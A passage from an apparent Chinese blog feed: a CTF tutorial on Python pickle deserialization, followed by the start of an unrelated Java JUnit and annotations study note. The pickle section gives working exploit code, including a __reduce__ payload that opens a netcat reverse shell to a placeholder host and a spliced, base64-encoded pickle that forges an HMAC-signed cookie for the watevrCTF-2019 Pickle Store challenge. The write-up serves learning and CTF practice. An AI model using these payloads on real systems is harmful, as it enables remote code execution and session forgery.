align="center">对象反序列化，从文件中读取数据</td></tr></tbody></table><h3 id="dump-x2F-load"><a href="#dump-x2F-load" class="headerlink" title="dump&#x2F;load"></a>dump&#x2F;load</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#序列化</span></span><br><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>,)</span><br><span class="line">obj表示要进行封装的对象(必填参数）</span><br><span class="line">file表示obj要写入的文件对象</span><br><span class="line">以二进制可写模式打开即wb(必填参数）</span><br><span class="line"><span class="comment">#反序列化</span></span><br><span class="line">pickle.load(file, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br><span class="line">file文件中读取封存后的对象</span><br><span class="line">以二进制可读模式打开即rb(必填参数)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">    <span class="variable language_">self</span>.a=a</span><br><span class="line">    <span class="variable language_">self</span>.b=b</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  test=Test1(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Lemon&#x27;</span>)</span><br><span class="line">  fp1=<span class="built_in">open</span>(<span class="string">&quot;sky.pkl&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">  pickle.dump(test,fp1) <span class="comment"># 序列化</span></span><br><span class="line">  fp1.close()</span><br><span class="line">  fp2=<span class="built_in">open</span>(<span class="string">&quot;shy.pkl&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">  data=pickle.load(fp2) <span class="comment"># 反序列化</span></span><br><span class="line">  fp2.close()</span><br></pre></td></tr></table></figure></div><h3 id="dumps-x2F-loads"><a href="#dumps-x2F-loads" class="headerlink" title="dumps&#x2F;loads"></a>dumps&#x2F;loads</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#序列化</span></span><br><span class="line">pickle.dumps(obj, protocol=<span class="literal">None</span>,*,fix_imports=<span class="literal">True</span>)</span><br><span class="line">dumps()方法不需要写入文件中，直接返回一个序列化的<span class="built_in">bytes</span>对象。</span><br><span class="line"><span class="comment">#反序列化</span></span><br><span class="line">pickle.loads(bytes_object, *,fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>. errors=<span class="string">&quot;strict&quot;</span>)</span><br><span class="line">loads()方法是直接从<span class="built_in">bytes</span>对象中读取序列化的信息，而非从文件中读取。</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">    <span class="variable language_">self</span>.a=a</span><br><span class="line">    <span class="variable language_">self</span>.b=b</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  test=Test1(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Lemon&#x27;</span>)</span><br><span class="line">  <span class="built_in">str</span>=pickle.dumps(test) <span class="comment"># 序列化</span></span><br><span class="line">  data=pickle.loads(<span class="built_in">str</span>) <span class="comment"># 反序列化</span></span><br><span class="line">  fp2.close()</span><br></pre></td></tr></table></figure></div><blockquote><p>序列化的字符串涉及到PVM</p></blockquote><h3 id="0x02-PVM–python虚拟机"><a href="#0x02-PVM–python虚拟机" class="headerlink" title="0x02 PVM–python虚拟机"></a>0x02 PVM–python虚拟机</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>与JVM类似，它可以直接从源代码运行程序。Python解释器会将源代码编译为字节码，然后将编译后的字节码转发到Python虚拟机中执行。总的来说，PVM的作用便是用来解释字节码的解释引擎。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul><li><p><code>PVM</code>会把源代码编译成字节码</p><blockquote><p>字节码是Python特有的一种表现形式，不是二进制机器码，需要进一步编译才能被机器执行 . 如果 Python 进程在主机上有写入权限 , 那么它会把程序字节码保存为一个以 .pyc 为扩展名的文件 . 如果没有写入权限 , 则 Python 进程会在内存中生成字节码 , 在程序执行结束后被自动丢弃 .</p></blockquote></li><li><p><code>Python</code>进程会把编译好的字节码转发到<code>PVM（Python虚拟机）</code>中，<code>PVM</code>会循环迭代执行字节码指令，直到所有操作被完成。</p></li></ul><h4 id="PVM与Pickle模块的关系"><a href="#PVM与Pickle模块的关系" class="headerlink" title="PVM与Pickle模块的关系"></a>PVM与Pickle模块的关系</h4><blockquote><p>Pickle是一门基于栈的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .</p><p>由三部分组成</p><ul><li>指令处理器( Instruction processor )</li><li>栈区( stack )</li><li>标签区( memo )</li></ul></blockquote><h4 id="指令处理器可读的操作码"><a href="#指令处理器可读的操作码" class="headerlink" title="指令处理器可读的操作码"></a>指令处理器可读的操作码</h4><ol><li><code>c</code>: 读取本行的内容作为模块名<code>module</code>, 读取下一行的内容作为对象名<code>object</code>，然后将 <code>module.object</code>作为可调用对象压入到栈中</li><li><code>(</code>: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组</li><li><code>S</code>: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中</li><li><code>t</code>: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中</li><li><code>R</code>: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 。最后将结果压入到栈中</li><li><code>.</code>: 结束整个 <code>Pickle</code>反序列化过程</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="reduce-魔术方法"><a href="#reduce-魔术方法" class="headerlink" title="__reduce__魔术方法"></a><code>__reduce__魔术方法</code></h3><p>反序列化漏洞出现在 <code>__reduce__()</code>魔法函数上，这一点和PHP中的<code>__wakeup()</code>魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。经常构造一个类，在该魔术方法中加入危险函数</p><p>另外<code>pickle.loads</code>会解决<code>import</code>问题，对于未引入的<code>module</code>会自动尝试<code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc vpsip port -e/bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(a))</span><br></pre></td></tr></table></figure></div><blockquote><p>当 <code>__reduce__()</code>函数返回一个元组时 , <strong>第一个元素</strong>是一个可调用对象 , 这个对象会在创建对象时被调用 . <strong>第二个元素</strong>是可调用对象的参数 , 同样是一个元组。这点跟我们上面提到的PVM中的<code>R</code>操作码功能相似，可以对比下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 。最后将结果压入到栈中 </span><br></pre></td></tr></table></figure></div><p>⚠️：在python2中只有内置类才有<code>__reduce__</code>方法，即用<code>class A(object)</code>声明的类，而<code>python3</code>中已经默认都是内置类了</p></blockquote><h3 id="可能出现的位置"><a href="#可能出现的位置" class="headerlink" title="可能出现的位置"></a>可能出现的位置</h3><ol><li>解析认证token、session的时候</li><li>将对象Pickle后存储成磁盘文件</li><li>将对象Pickle后在网络中传输</li><li>参数传递给程序</li></ol><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#模仿Epicccal师傅的例子</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment">#被调用函数的参数</span></span><br><span class="line">        cmd = <span class="string">&quot;/usr/bin/id&quot;</span> </span><br><span class="line">        <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test = Test2()</span><br><span class="line">    <span class="comment">#执行序列化操作</span></span><br><span class="line">    result1 = pickle.dumps(test)</span><br><span class="line">    <span class="comment">#执行反序列化操作</span></span><br><span class="line">    result2 = pickle.loads(result1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __reduce__()魔法方法的返回值:</span></span><br><span class="line"><span class="comment"># return(os.system,(cmd,))</span></span><br><span class="line"><span class="comment"># 1.满足返回一个元组，元组中有两个参数</span></span><br><span class="line"><span class="comment"># 2.第一个参数是被调用函数 : os.system()</span></span><br><span class="line"><span class="comment"># 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd</span></span><br><span class="line"><span class="comment"># 4. 因此序列化时被解析执行的代码是 os.system(&quot;/usr/bin/id&quot;)</span></span><br></pre></td></tr></table></figure></div><blockquote><ul><li>os.system和os.popen</li></ul><p>os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0 os.popen() 无法读取程序执行的返回值,可以使用<code>commands.getoutput()</code>这个函数(回显结果)来进行代替，构造payload</p></blockquote><h3 id="拼接覆盖key-伪造cookie"><a href="#拼接覆盖key-伪造cookie" class="headerlink" title="拼接覆盖key,伪造cookie"></a>拼接覆盖key,伪造cookie</h3><p>[watevrCTF-2019]Pickle Store</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>设置余额为10000</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"></span><br><span class="line">key=<span class="string">b&#x27;66666666666666666666666666666666&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;money&quot;</span>:<span class="number">10000</span>,<span class="string">&quot;history&quot;</span>:[]&#125;</span><br><span class="line">h = hmac.new(key)</span><br><span class="line">h.update(<span class="built_in">str</span>(cookies).encode())</span><br><span class="line">cookies[<span class="string">&quot;anti_tamper_hmac&quot;</span>] = h.digest().<span class="built_in">hex</span>()</span><br><span class="line">result2 = pickle.dumps(cookies)</span><br><span class="line"><span class="built_in">print</span>(result2)</span><br></pre></td></tr></table></figure></div><p>输出</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</span><br></pre></td></tr></table></figure></div><blockquote><p>但是key的覆盖只在因此请求中生效，伪造的cookie也必须一起发送，这时候就要拼接两个操作，把第一个pickle流结尾表示结束的.去掉，把第二个pickle开头的版本声明去掉，将两者拼接</p></blockquote><p>第二个pickle流：<br><code>b&quot;\x80\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#39;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</code></p><p>拼接后</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x80\x03cbuiltins\nexec\nq\x00X4\x00\x00\x00global key;key = b&#x27;66666666666666666666666666666666&#x27;q\x01\x85q\x02Rq\x03&#125;q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#x27;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&quot;</span><br></pre></td></tr></table></figure></div><p>base64编码后,注意要用python脚本，因为python中字符串<strong>b 前缀代表的就是bytes</strong> </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gANjYnVpbHRpbnMKZXhlYwpxAFg0AAAAZ2xvYmFsIGtleTtrZXkgPSBiJzY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2J3EBhXECUnEDfXEAKFgFAAAAbW9uZXlxAU0QJ1gHAAAAaGlzdG9yeXECXXEDWBAAAABhbnRpX3RhbXBlcl9obWFjcQRYIAAAAGNjYjQ4N2VlYzFjYjY2ZGRhOGQwMGE4MTIxYWViNGJmcQV1Lg==</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web学习</title>
      <link href="/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/07/20/Java-Web%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA-WEB学习"><a href="#JAVA-WEB学习" class="headerlink" title="JAVA WEB学习"></a>JAVA WEB学习</h1><h2 id="Junit-单元测试"><a href="#Junit-单元测试" class="headerlink" title="Junit 单元测试"></a>Junit 单元测试</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="0x01-定义一个测试类"><a href="#0x01-定义一个测试类" class="headerlink" title="0x01 定义一个测试类"></a>0x01 定义一个测试类</h4><p>建议：</p><p>测试类名：被测试的类名+Test  e.g. CalculatorTest </p><p>包名：xxx.xxx.xx.test      e.g. cn.itcast.test</p><h4 id="0x02-定义测试方法-可以独立运行"><a href="#0x02-定义测试方法-可以独立运行" class="headerlink" title="0x02 定义测试方法:可以独立运行"></a>0x02 定义测试方法:可以独立运行</h4><p>建议</p><p>方法名：test+测试的方法名 testAdd()</p><p>返回值: void</p><p>参数列表：空参</p><h4 id="0x03-导入junit依赖环境"><a href="#0x03-导入junit依赖环境" class="headerlink" title="0x03 导入junit依赖环境"></a>0x03 导入junit依赖环境</h4><h4 id="0x04-给方法加注解-Test使其能独立运行"><a href="#0x04-给方法加注解-Test使其能独立运行" class="headerlink" title="0x04 给方法加注解@Test使其能独立运行"></a>0x04 给方法加注解@Test使其能独立运行</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorTest</span> &#123;</span><br><span class="line">    <span class="comment">//自定义初始化方法，用于资源申请，所有测试方法在执行前都先执行这个方法（加注解@Before实现）</span></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放资源方法，所有测试方法执行完后自动执行（加注解@After实现）</span></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;close..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//测试add方法</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAdd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//System.out.println(&quot;被执行&quot;);</span></span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        Calculator c=<span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">        <span class="type">int</span> res=c.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">        <span class="comment">//断言判断方法输出</span></span><br><span class="line">        Assert.assertEquals(<span class="number">3</span>,res);<span class="comment">//第一个参数是期望输出值，若不一样会报错</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>添加断言操作处理结果</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//断言判断方法输出</span></span><br><span class="line">Assert.assertEquals(<span class="number">3</span>,res);<span class="comment">//第一个参数是期望输出值，若不一样会报错</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="Before-After"><a href="#Before-After" class="headerlink" title="@Before @After"></a>@Before @After</h3><p>特殊注解，用于指定初始化方法与释放资源方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义初始化方法，用于资源申请，所有测试方法在执行前都先执行这个方法（加注解@Before实现）</span></span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;init..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//释放资源方法，所有测试方法执行完后自动执行（加注解@After实现）</span></span><br><span class="line"><span class="meta">@After</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;close..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>即使测试方法中有报错（如断言报错等）仍会执行@After后方法</p></blockquote><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>代码级别的说明，给计算机看的，JDK1.5后新特性，一般格式：<code>@注解名称</code></p><h3 id="预定义注解"><a href="#预定义注解" class="headerlink" title="预定义注解"></a>预定义注解</h3><ul><li>@Override :检测该注解标注的方法是否是继承自父类或父接口</li><li>@Deprecated ：将该注解标注的内容，已过时</li><li>@SuppressWarnings ：压制警告 （可以放在类的前面，压制其所有警告）</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//预定义注解</span></span><br><span class="line"><span class="meta">@Override</span><span class="comment">//检测重写父类/父端口方法</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Deprecated</span><span class="comment">//表示标注方法已过时</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//有缺陷</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span><span class="comment">//压制show2方法的所有警告</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//代替show1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h3><h5 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h5><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">元注解</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> 注解名称&#123;</span><br><span class="line">  属性列表</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//🌰</span></span><br><span class="line"><span class="meta">@Target(value=&#123;ElementType.TYPE&#125;)</span> <span class="comment">//该注解只能作用与类上</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;sqhy&quot;</span>;<span class="comment">//使用时可以不用赋值，默认为sqhy</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span>;</span><br><span class="line">    Person <span class="title function_">per</span><span class="params">()</span>;</span><br><span class="line">    MyAnno2 <span class="title function_">anno2</span><span class="params">()</span>;</span><br><span class="line">    String[] strs();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>本质是一个接口,默认继承自Annotation接口，该接口是所有注释类型扩展的公共接口，但其本身不定义注释类型</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> interface 注解名称 <span class="keyword">extends</span> <span class="title class_">java</span>.lang.annotation.Annotation &#123;&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h5 id="注解的属性–可定义的成员方法-接口中的抽象方法"><a href="#注解的属性–可定义的成员方法-接口中的抽象方法" class="headerlink" title="注解的属性–可定义的成员方法(接口中的抽象方法)"></a>注解的属性–可定义的成员方法(接口中的抽象方法)</h5><p>注解的属性类似类的成员变量，取名可以取成变量名，使用时的括号中赋值</p><p><strong>要求</strong></p><ol><li><p>属性的返回类型</p><ul><li>基本数据类型</li><li>String</li><li>枚举</li><li>注解</li><li>以上类型的数组</li></ul></li><li><p>定义了属性，使用时要赋值</p><ul><li><p>可以使用default关键字给属性默认初始化，这样使用时可以不用赋值</p></li><li><p>如果只有一个属性要赋值，并且名称叫value，可以直接括号中定义值</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MyAnno(12)</span></span><br></pre></td></tr></table></figure></div></li><li><p>数组赋值时，多个元素用{}包裹，如果只有一个值可以省略{}</p></li></ul></li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MyAnno(age=12,per= Person.P1,anno2=@MyAnno2,strs=&#123;&quot;abc&quot;,&quot;sddw&quot;&#125;)</span></span><br></pre></td></tr></table></figure></div><h4 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h4><p>描述注解的注解(属性基本都叫value，类型为枚举)</p><ul><li><p>@Target ：描述注解能够作用的位置</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(value=&#123;ElementType.TYPE&#125;)</span> <span class="comment">//该注解只能作用与类上</span></span><br></pre></td></tr></table></figure></div><ul><li>ElementType取值<ul><li>TYPE:可以作用于类上</li><li>METHOD:可以作用于方法上</li><li>FIELD:可以作用于成员变量上</li></ul></li></ul></li><li><p>@Retention :描述注解能被保留的阶段</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="comment">//当前被描述注解，会保留到class字节码文件中,并被JVM读取到</span></span><br></pre></td></tr></table></figure></div></li><li><p>@Documented :描述注解是否被抽取到api文档中</p><blockquote><p>api文档，javadoc命令生成的文档（与帮助手册一样）</p></blockquote></li><li><p>@Inherited :描述注解是否被子类继承</p></li></ul><h3 id="程序中使用-解析-注解"><a href="#程序中使用-解析-注解" class="headerlink" title="程序中使用(解析)注解"></a>程序中使用(解析)注解</h3><ol><li><p>获取注解定义的位置下的对象（Class，Method，Field）</p></li><li><p>获取指定注解</p><ul><li><p>getAnnotation(Class)</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pro</span> <span class="variable">an</span> <span class="operator">=</span> calculatorTestClass.getAnnotation(pro.class);</span><br><span class="line"><span class="comment">//其实就是在内存中生成类一个该注解接口(pro)的子类实现对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProImpl</span> <span class="keyword">implements</span> <span class="title class_">pro</span>&#123;</span><br><span class="line"> 